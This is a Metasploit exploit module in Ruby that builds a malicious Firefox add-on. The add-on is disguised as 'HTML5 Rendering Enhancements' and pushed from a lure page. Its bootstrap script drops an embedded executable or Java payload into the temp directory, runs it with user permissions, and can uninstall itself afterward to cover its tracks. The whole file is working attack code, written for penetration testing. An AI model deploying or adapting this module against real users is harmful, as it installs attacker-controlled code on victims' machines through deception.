# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;rex/zip&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
 
    def initialize( info = {} )
        super( update_info( info,
            &#039;Name&#039;          => &#039;Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution&#039;,
            &#039;Description&#039;   => %q{
                    This exploit dynamically creates a .xpi addon file.
                the victim via a web page with.  The victim&#039;s Firefox browser
                will pop a dialog asking if they trust the addon.
 
                Once the user clicks "install", the addon is installed and
                executes the payload with full user permissions. As of Firefox
                4, this will work without a restart as the addon is marked to
                be "bootstrapped". As the addon will execute the payload after
                each Firefox restart, an option can be given to automatically
                uninstall the addon once the payload has been executed.
            },
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Author&#039;        => [ &#039;mihi&#039; ],
            &#039;References&#039;    =>
                [
                    [ &#039;URL&#039;, &#039;https://developer.mozilla.org/en/Extensions/Bootstrapped_extensions&#039; ],
                    [ &#039;URL&#039;, &#039;http://dvlabs.tippingpoint.com/blog/2007/06/27/xpi-the-next-malware-vector&#039; ]
                ],
            &#039;DisclosureDate&#039; => &#039;Jun 27 2007&#039;,
            &#039;Platform&#039;      => [ &#039;java&#039;, &#039;win&#039;, &#039;osx&#039;, &#039;linux&#039;, &#039;solaris&#039; ],
            &#039;Payload&#039;       => { &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
            &#039;Targets&#039;       =>
                [
                    [ &#039;Generic (Java Payload)&#039;,
                        {
                            &#039;Platform&#039; => [&#039;java&#039;],
                            &#039;Arch&#039; => ARCH_JAVA
                        }
                    ],
                    [ &#039;Windows x86 (Native Payload)&#039;,
                        {
                            &#039;Platform&#039; => &#039;win&#039;,
                            &#039;Arch&#039; => ARCH_X86,
                        }
                    ],
                    [ &#039;Linux x86 (Native Payload)&#039;,
                        {
                            &#039;Platform&#039; => &#039;linux&#039;,
                            &#039;Arch&#039; => ARCH_X86,
                        }
                    ],
                    [ &#039;Mac OS X PPC (Native Payload)&#039;,
                        {
                            &#039;Platform&#039; => &#039;osx&#039;,
                            &#039;Arch&#039; => ARCH_PPC,
                        }
                    ],
                    [ &#039;Mac OS X x86 (Native Payload)&#039;,
                        {
                            &#039;Platform&#039; => &#039;osx&#039;,
                            &#039;Arch&#039; => ARCH_X86,
                        }
                    ]
                ],
            &#039;DefaultTarget&#039;  => 1
        ))
 
        register_options( [
            OptString.new(&#039;ADDONNAME&#039;, [ true,
                "The addon name.",
                "HTML5 Rendering Enhancements"
                ]),
            OptBool.new(&#039;AutoUninstall&#039;, [ true,
                "Automatically uninstall the addon after payload execution",
                true
                ])
        ], self.class)
    end
 
    def on_request_uri( cli, request )
        msg = "#{cli.peerhost.ljust(16)} #{self.shortname}"
 
        if not request.uri.match(/\.xpi$/i)
            if not request.uri.match(/\/$/)
                send_redirect( cli, get_resource() + &#039;/&#039;, &#039;&#039;)
                return
            end
 
            print_status("#{msg} Handling request..." )
 
            send_response_html( cli, generate_html, { &#039;Content-Type&#039; => &#039;text/html&#039; } )
            return
        end
 
        p = regenerate_payload(cli)
        if not p
            print_error("#{msg} Failed to generate the payload.")
            # Send them a 404 so the browser doesn&#039;t hang waiting for data
            # that will never come.
            send_not_found(cli)
            return
        end
 
        # If we haven&#039;t returned yet, then this is a request for our xpi,
        # so build one
 
        if target.name == &#039;Generic (Java Payload)&#039;
            jar = p.encoded_jar
            jar.build_manifest(:main_class => "metasploit.Payload")
            payload_file = jar.pack
            payload_name=&#039;payload.jar&#039;
            payload_script=%q|
    var java = Components.classes["@mozilla.org/appshell/window-mediator;1"].getService(Components.interfaces.nsIWindowMediator).getMostRecentWindow(&#039;navigator:browser&#039;).Packages.java
    java.lang.System.setSecurityManager(null);
    var cl = new java.net.URLClassLoader([new java.io.File(tmp.path).toURI().toURL()]);
    var m = cl.loadClass("metasploit.Payload").getMethod("main", [java.lang.Class.forName("[Ljava.lang.String;")]);
    m.invoke(null, [java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.lang.String"), 0)]);
            |
        else
            payload_file = generate_payload_exe
            payload_name=&#039;payload.exe&#039;
            payload_script=%q|
    var process=Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
    process.init(tmp);
    process.run(false,[],0);
            |
        end
 
        zip = Rex::Zip::Archive.new
        xpi_guid = &#039;{d0df471a-9896-4e6d-83e2-13a04ed6df33}&#039; #TODO randomize!
 
        bootstrap_script = %q|
function startup(data, reason) {
    var file = Components.classes["@mozilla.org/file/directory_service;1"].
                    getService(Components.interfaces.nsIProperties).
                    get("ProfD", Components.interfaces.nsIFile);
    file.append("extensions");
        |
        bootstrap_script << %Q|xpi_guid="#{xpi_guid}";|
        bootstrap_script << %Q|payload_name="#{payload_name}";|
        bootstrap_script << %q|
    file.append(xpi_guid);
    file.append(payload_name);
    var tmp = Components.classes["@mozilla.org/file/directory_service;1"].
                    getService(Components.interfaces.nsIProperties).
                    get("TmpD", Components.interfaces.nsIFile);
    tmp.append(payload_name);
    tmp.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
    file.copyTo(tmp.parent, tmp.leafName);
        |
        bootstrap_script << payload_script
 
        if (datastore[&#039;AutoUninstall&#039;])
            bootstrap_script <<  %q|
    try { // Fx < 4.0
        Components.classes["@mozilla.org/extensions/manager;1"].getService(Components.interfaces.nsIExtensionManager).uninstallItem(xpi_guid);
    } catch (e) {}
    try { // Fx 4.0 and later
        Components.utils.import("resource://gre/modules/AddonManager.jsm");
        AddonManager.getAddonByID(xpi_guid, function(addon) {
            addon.uninstall();
        });
    } catch (e) {}
            |
        end
 
        bootstrap_script << "}"
 
        zip.add_file(&#039;bootstrap.js&#039;, bootstrap_script)
        zip.add_file(payload_name, payload_file)
        zip.add_file(&#039;chrome.manifest&#039;, "content\t#{xpi_guid}\t./\noverlay\tchrome://browser/content/browser.xul\tchrome://#{xpi_guid}/content/overlay.xul\n")
        zip.add_file(&#039;install.rdf&#039;, %Q|<?xml version="1.0"?>
<RDF xmlns="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:em="http://www.mozilla.org/2004/em-rdf#">
    <Description about="urn:mozilla:install-manifest">
        <em:id>#{xpi_guid}</em:id>
        <em:name>#{datastore[&#039;ADDONNAME&#039;]}</em:name>
        <em:version>1.0</em:version>
        <em:bootstrap>true</em:bootstrap>
        <em:unpack>true</em:unpack>
        <em:targetApplication>
            <Description>
                <em:id>toolkit@mozilla.org</em:id>
                <em:minVersion>1.0</em:minVersion>
                <em:maxVersion>*</em:maxVersion>
            </Description>
        </em:targetApplication>
        <em:targetApplication>
            <Description>
                <em:id>{ec8030f7-c20a-464f-9b0e-13a3a9e97384}</em:id>
                <em:minVersion>1.0</em:minVersion>
                <em:maxVersion>*</em:maxVersion>
            </Description>
        </em:targetApplication>
        </Description>
</RDF>|)
zip.add_file(&#039;overlay.xul&#039;, %q|<?xml version="1.0"?>
<overlay xmlns="http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul">
    <script src="bootstrap.js"/>
    <script><![CDATA[window.addEventListener("load", function(e) { startup(); }, false);]]></script>
</overlay>|)
 
        print_status("#{msg} Sending xpi and waiting for user to click &#039;accept&#039;...")
        send_response( cli, zip.pack, { &#039;Content-Type&#039; => &#039;application/x-xpinstall&#039; } )
        handler( cli )
    end
 
    def generate_html
        html  = %Q|<html><head><title>Loading, Please Wait...</title></head>\n|
        html << %Q|<body><center><p>Addon required to view this page. <a href="addon.xpi">[Install]</a></p></center>\n|
        html << %Q|<script>window.location.href="addon.xpi";</script>\n|
        html << %Q|</body></html>|
        return html
    end
end



